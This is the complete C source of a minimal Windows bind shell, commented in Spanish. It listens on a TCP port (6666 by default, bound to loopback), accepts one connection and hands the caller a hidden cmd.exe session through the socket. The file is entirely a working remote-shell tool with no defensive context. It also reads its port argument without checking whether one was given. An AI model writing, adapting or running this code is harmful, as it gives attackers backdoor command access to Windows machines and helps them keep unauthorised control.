/*******************************************
 * bind shell minima para win32
 * por defecto escucha en 127.0.0.1:6666
 *******************************************/

 // librerias
#include <winsock2.h>

// por defecto escucha en 6666
#define PORT 6666

// funcion principal
int main (int argc, char *argv[]) 
{
   int s;
   STARTUPINFO si;
   struct sockaddr_in sa;
   PROCESS_INFORMATION pi;
   WSADATA HWSAdata;
   
   // creamos socket
   WSAStartup(0x0101, &HWSAdata);
   s = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, 0, 0, 0);

   // configuramos
   sa.sin_family = AF_INET;
   sa.sin_port = htons(atoi(argv[1]) ? atoi(argv[1]) : PORT);
   sa.sin_addr.s_addr= htonl(INADDR_LOOPBACK);

   // a escuchar en puerto
   bind(s, (struct sockaddr *) &sa, sizeof(sa));
   listen(s, 1); s = accept(s,(struct sockaddr *)&sa, 0);

   // redirigimos i/o a socket
   memset(&si, 0, sizeof(si));
   si.cb = sizeof(si);
   si.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
   si.hStdInput = si.hStdOutput = si.hStdError = (void *) s;

   // lanzamos proceso
   return !CreateProcess(0, "cmd", 0, 0, 1, 0, 0, 0, &si, &pi);
}
